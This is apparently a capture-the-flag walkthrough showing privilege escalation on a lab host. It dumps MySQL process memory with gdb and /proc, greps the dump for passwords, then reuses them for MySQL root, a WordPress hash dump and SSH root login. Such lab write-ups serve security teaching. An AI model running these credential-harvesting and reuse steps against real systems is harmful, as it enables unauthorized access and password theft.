Running process contains credentials in memory.

### Initial Access
```
# Shell as low-priv user on 10.10.10.95
# Found running processes
ps aux | grep -E "mysql|postgres|redis|apache"
# mysql: /usr/sbin/mysqld
```

#### Dump Process Memory
```
# Find PID of MySQL
pgrep mysqld
# 1234

# Dump memory
gdb -p 1234
(gdb) gcore /tmp/mysql.dump
(gdb) quit

# Or use /proc
cat /proc/1234/mem > /tmp/mysql.mem 2>/dev/null
```

#### Extract Credentials
```
# Search for passwords in dump
strings /tmp/mysql.dump | grep -E "pass|user|cred|secret"
# root:MySuperSecretRootPass123!
# wp_user:WordPressPass456

# Also check for queries
strings /tmp/mysql.dump | grep -E "SELECT|INSERT|UPDATE"
# SELECT * FROM users WHERE user='admin' AND pass='AdminPass789'
```

#### Use Found Credentials
```
# MySQL root access
mysql -u root -pMySuperSecretRootPass123!

# Dump database
show databases;
use wordpress;
SELECT user_login, user_pass FROM wp_users;
# admin:$P$B...

# SSH with found creds (if same)
ssh root@10.10.10.95
# MySuperSecretRootPass123!
# Success!

# Get flags
cat /root/root.txt
# 5f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c
```

